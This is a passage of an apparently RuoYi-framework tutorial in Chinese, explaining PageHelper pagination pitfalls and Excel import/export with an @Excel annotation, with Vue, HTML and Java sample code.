<p>1、前端定义分页流程</p>
<pre><code class="prism language-javascript"><span class="token comment">// 一般在查询参数中定义分页变量</span>
queryParams<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
  pageNum<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  pageSize<span class="token operator">:</span> <span class="token number">10</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>

<span class="token comment">// 页面添加分页组件，传入分页变量</span>
<span class="token operator">&lt;</span>pagination
  v<span class="token operator">-</span>show<span class="token operator">=</span><span class="token string">"total&gt;0"</span>
  <span class="token operator">:</span>total<span class="token operator">=</span><span class="token string">"total"</span>
  <span class="token operator">:</span>page<span class="token punctuation">.</span>sync<span class="token operator">=</span><span class="token string">"queryParams.pageNum"</span>
  <span class="token operator">:</span>limit<span class="token punctuation">.</span>sync<span class="token operator">=</span><span class="token string">"queryParams.pageSize"</span>
  @pagination<span class="token operator">=</span><span class="token string">"getList"</span>
<span class="token operator">/</span><span class="token operator">&gt;</span>

<span class="token comment">// 调用后台方法，传入参数 获取结果</span>
<span class="token function">listUser</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>userList <span class="token operator">=</span> response<span class="token punctuation">.</span>rows<span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>total <span class="token operator">=</span> response<span class="token punctuation">.</span>total<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<h3><a id="3_1360"></a>.3、后台逻辑实现</h3>
<pre><code class="prism language-java"><span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/list"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token class-name">TableDataInfo</span> <span class="token function">list</span><span class="token punctuation">(</span><span class="token class-name">User</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 此方法配合前端完成自动分页</span>
    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<ul><li>常见坑点1：<code>selectPostById</code>莫名其妙的分页。例如下面这段代码</li></ul>
<pre><code class="prism language-java"><span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
    list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">Post</span> post <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">selectPostById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>原因分析：这种情况下由于<code>user</code>存在<code>null</code>的情况，就会导致<code>pageHelper</code>生产了一个分页参数，但是没有被消费，这个参数就会一直保留在这个线程上。 当这个线程再次被使用时，就可能导致不该分页的方法去消费这个分页参数，这就产生了莫名其妙的分页。<br/> 上面这个代码，应该写成下面这个样子才能保证安全。</p>
<pre><code class="prism language-java"><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list<span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>user <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
	<span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
	list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token class-name">Post</span> post <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">selectPostById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<ul><li>常见坑点2：添加了<code>startPage</code>方法。也没有正常分页。例如下面这段代码</li></ul>
<pre><code class="prism language-java"><span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Post</span> post <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">selectPostById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>原因分析：只对该语句以后的第一个查询<code>（Select）</code>语句得到的数据进行分页。<br/> 上面这个代码，应该写成下面这个样子才能正常分页。</p>
<pre><code class="prism language-java"><span class="token class-name">Post</span> post <span class="token operator">=</span> postService<span class="token punctuation">.</span><span class="token function">selectPostById</span><span class="token punctuation">(</span><span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">startPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">User</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token function">getDataTable</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>注意</p>
<pre><code class="prism language-tex">如果改为其他数据库需修改配置`application.yml`文件中的属性`helperDialect=你的数据库`
</code></pre>
<h2><a id="_1437"></a>七、导入导出</h2>
<p>在实际开发中经常需要使用导入导出功能来加快数据的操作。在项目中可以使用注解来完成此项功能。 在需要被导入导出的实体类属性添加<code>@Excel</code>注解，目前支持参数如下：</p>
<h3><a id="1_1441"></a>.1、注解参数说明</h3>
<table><thead><tr><th>参数</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>sort</td><td>int</td><td>Integer.MAX_VALUE</td><td>导出时在excel中排序，值越小越靠前</td></tr><tr><td>name</td><td>String</td><td>空</td><td>导出到Excel中的名字</td></tr><tr><td>dateFormat</td><td>String</td><td>空</td><td>日期格式, 如: yyyy-MM-dd</td></tr><tr><td>dictType</td><td>String</td><td>空</td><td>如果是字典类型，请设置字典的type值 (如: sys_user_sex)</td></tr><tr><td>readConverterExp</td><td>String</td><td>空</td><td>读取内容转表达式 (如: 0=男,1=女,2=未知)</td></tr><tr><td>separator</td><td>String</td><td>,</td><td>分隔符，读取字符串组内容</td></tr><tr><td>scale</td><td>int</td><td>-1</td><td>BigDecimal 精度 默认:-1(默认不开启BigDecimal格式化)</td></tr><tr><td>roundingMode</td><td>int</td><td>BigDecimal.ROUND_HALF_EVEN</td><td>BigDecimal 舍入规则 默认:BigDecimal.ROUND_HALF_EVEN</td></tr><tr><td>columnType</td><td>Enum</td><td>Type.STRING</td><td>导出类型（0数字 1字符串 2图片）</td></tr><tr><td>height</td><td>String</td><td>14</td><td>导出时在excel中每个列的高度 单位为字符</td></tr><tr><td>width</td><td>String</td><td>16</td><td>导出时在excel中每个列的宽 单位为字符</td></tr><tr><td>suffix</td><td>String</td><td>空</td><td>文字后缀,如% 90 变成90%</td></tr><tr><td>defaultValue</td><td>String</td><td>空</td><td>当值为空时,字段的默认值</td></tr><tr><td>prompt</td><td>String</td><td>空</td><td>提示信息</td></tr><tr><td>combo</td><td>String</td><td>Null</td><td>设置只能选择不能输入的列内容</td></tr><tr><td>targetAttr</td><td>String</td><td>空</td><td>另一个类中的属性名称,支持多级获取,以小数点隔开</td></tr><tr><td>isStatistics</td><td>boolean</td><td>false</td><td>是否自动统计数据,在最后追加一行统计数据总和</td></tr><tr><td>type</td><td>Enum</td><td>Type.ALL</td><td>字段类型（0：导出导入；1：仅导出；2：仅导入）</td></tr><tr><td>align</td><td>Enum</td><td>Type.AUTO</td><td>导出字段对齐方式（0：默认；1：靠左；2：居中；3：靠右）</td></tr><tr><td>handler</td><td>Class</td><td>ExcelHandlerAdapter.class</td><td>自定义数据处理器</td></tr><tr><td>args</td><td>String[]</td><td>{}</td><td>自定义数据处理器参数</td></tr></tbody></table>
<h3><a id="2_1467"></a>.2、导出实现流程</h3>
<p>1、前端调用方法（参考如下）</p>
<pre><code class="prism language-javascript"><span class="token comment">// 查询参数 queryParams</span>
queryParams<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
  pageNum<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
  pageSize<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>
  userName<span class="token operator">:</span> <span class="token keyword">undefined</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>

<span class="token comment">// 导出接口exportUser</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> exportUser <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/system/user"</span><span class="token punctuation">;</span>

<span class="token comment">/** 导出按钮操作 */</span>
<span class="token function">handleExport</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">const</span> queryParams <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>queryParams<span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$confirm</span><span class="token punctuation">(</span><span class="token string">'是否确认导出所有用户数据项?'</span><span class="token punctuation">,</span> <span class="token string">"警告"</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>
	  confirmButtonText<span class="token operator">:</span> <span class="token string">"确定"</span><span class="token punctuation">,</span>
	  cancelButtonText<span class="token operator">:</span> <span class="token string">"取消"</span><span class="token punctuation">,</span>
	  type<span class="token operator">:</span> <span class="token string">"warning"</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	  <span class="token keyword">return</span> <span class="token function">exportUser</span><span class="token punctuation">(</span>queryParams<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
	  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">download</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、添加导出按钮事件</p>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span>
  <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>warning<span class="token punctuation">"</span></span>
  <span class="token attr-name">icon</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-icon-download<span class="token punctuation">"</span></span>
  <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mini<span class="token punctuation">"</span></span>
  <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleExport<span class="token punctuation">"</span></span>
<span class="token punctuation">&gt;</span></span>导出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>3、在实体变量上添加@Excel注解</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户序号"</span><span class="token punctuation">,</span> prompt <span class="token operator">=</span> <span class="token string">"用户编号"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">Long</span> userId<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户名称"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> userName<span class="token punctuation">;</span>
	
<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户性别"</span><span class="token punctuation">,</span> readConverterExp <span class="token operator">=</span> <span class="token string">"0=男,1=女,2=未知"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> sex<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"用户头像"</span><span class="token punctuation">,</span> cellType <span class="token operator">=</span> <span class="token class-name">ColumnType</span><span class="token punctuation">.</span>IMAGE<span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> avatar<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"帐号状态"</span><span class="token punctuation">,</span> dictType <span class="token operator">=</span> <span class="token string">"sys_normal_disable"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">String</span> status<span class="token punctuation">;</span>

<span class="token annotation punctuation">@Excel</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"最后登陆时间"</span><span class="token punctuation">,</span> width <span class="token operator">=</span> <span class="token number">30</span><span class="token punctuation">,</span> dateFormat <span class="token operator">=</span> <span class="token string">"yyyy-MM-dd HH:mm:ss"</span><span class="token punctuation">)</span>
<span class="token keyword">private</span> <span class="token class-name">Date</span> loginDate<span class="token punctuation">;</span>
</code></pre>
<p>4、在Controller添加导出方法</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@Log</span><span class="token punctuation">(</span>title <span class="token operator">=</span> <span class="token string">"用户管理"</span><span class="token punctuation">,</span> businessType <span class="token operator">=</span> <span class="token class-name">BusinessType</span><span class="token punctuation">.</span>EXPORT<span class="token punctuation">)</span>
<span class="token annotation punctuation">@PreAuthorize</span><span class="token punctuation">(</span><span class="token string">"@ss.hasPermi('system:user:export')"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/export"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">export</span><span class="token punctuation">(</span><span class="token class-name">SysUser</span> user<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> list <span class="token operator">=</span> userService<span class="token punctuation">.</span><span class="token function">selectUserList</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span> util <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExcelUtil</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SysUser</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token class-name">SysUser</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> util<span class="token punctuation">.</span><span class="token function">exportExcel</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token string">"用户数据"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h3><a id="3_1552"></a>.3、导入实现流程</h3>
<p>1、前端调用方法（参考如下）</p>
<pre><code class="prism language-javascript"><span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getToken <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/utils/auth"</span><span class="token punctuation">;</span>

<span class="token comment">// 用户导入参数</span>
upload<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 是否显示弹出层（用户导入）</span>
  open<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token comment">// 弹出层标题（用户导入）</span>
  title<span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
  <span class="token comment">// 是否禁用上传</span>
  isUploading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
  <span class="token comment">// 是否更新已经存在的用户数据</span>
  updateSupport<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
  <span class="token comment">// 设置上传的请求头部</span>
  headers<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> Authorization<span class="token operator">:</span> <span class="token string">"Bearer "</span> <span class="token operator">+</span> <span class="token function">getToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token comment">// 上传的地址</span>
  url<span class="token operator">:</span> process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">VUE_APP_BASE_API</span> <span class="token operator">+</span> <span class="token string">"/system/user/importData"</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>

<span class="token comment">// 导入模板接口importTemplate</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> importTemplate <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/system/user"</span><span class="token punctuation">;</span>

<span class="token comment">/** 导入按钮操作 */</span>
<span class="token function">handleImport</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"用户导入"</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>open <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">/** 下载模板操作 */</span>
<span class="token function">importTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function">importTemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">response</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">download</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">// 文件上传中处理</span>
<span class="token function">handleFileUploadProgress</span><span class="token punctuation">(</span><span class="token parameter">event<span class="token punctuation">,</span> file<span class="token punctuation">,</span> fileList</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>isUploading <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">// 文件上传成功处理</span>
<span class="token function">handleFileSuccess</span><span class="token punctuation">(</span><span class="token parameter">response<span class="token punctuation">,</span> file<span class="token punctuation">,</span> fileList</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>open <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>upload<span class="token punctuation">.</span>isUploading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function">clearFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$alert</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>msg<span class="token punctuation">,</span> <span class="token string">"导入结果"</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> dangerouslyUseHTMLString<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
<span class="token comment">// 提交上传文件</span>
<span class="token function">submitFileForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>upload<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>2、添加导入按钮事件</p>
<pre><code class="prism language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-button</span>
  <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span>
  <span class="token attr-name">icon</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-icon-upload2<span class="token punctuation">"</span></span>
  <span class="token attr-name">size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mini<span class="token punctuation">"</span></span>
  <span class="token attr-name">@click</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleImport<span class="token punctuation">"</span></span>
<span class="token punctuation">&gt;</span></span>导入<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>el-button</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>3、添加导入前端代码</p>
<pre><code class="prism language-html"><span class="token comment">&lt;!-- 用户导入对话框 --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-dialog</span> <span class="token attr-name">:title</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.title<span class="token punctuation">"</span></span> <span class="token attr-name">:visible.sync</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.open<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400px<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-upload</span>
	<span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span>
	<span class="token attr-name">:limit</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span>
	<span class="token attr-name">accept</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>.xlsx, .xls<span class="token punctuation">"</span></span>
	<span class="token attr-name">:headers</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.headers<span class="token punctuation">"</span></span>
	<span class="token attr-name">:action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.url + <span class="token punctuation">'</span>?updateSupport=<span class="token punctuation">'</span> + upload.updateSupport<span class="token punctuation">"</span></span>
	<span class="token attr-name">:disabled</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.isUploading<span class="token punctuation">"</span></span>
	<span class="token attr-name">:on-progress</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleFileUploadProgress<span class="token punctuation">"</span></span>
	<span class="token attr-name">:on-success</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleFileSuccess<span class="token punctuation">"</span></span>
	<span class="token attr-name">:auto-upload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span>
	<span class="token attr-name">drag</span>
  <span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-icon-upload<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-upload__text<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	  将文件拖到此处，或
	  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">&gt;</span></span>点击上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>el-upload__tip<span class="token punctuation">"</span></span> <span class="token attr-name">slot</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tip<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
	  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>el-checkbox</span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload.updateSupport<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span>是否更新已经存在的用户数据
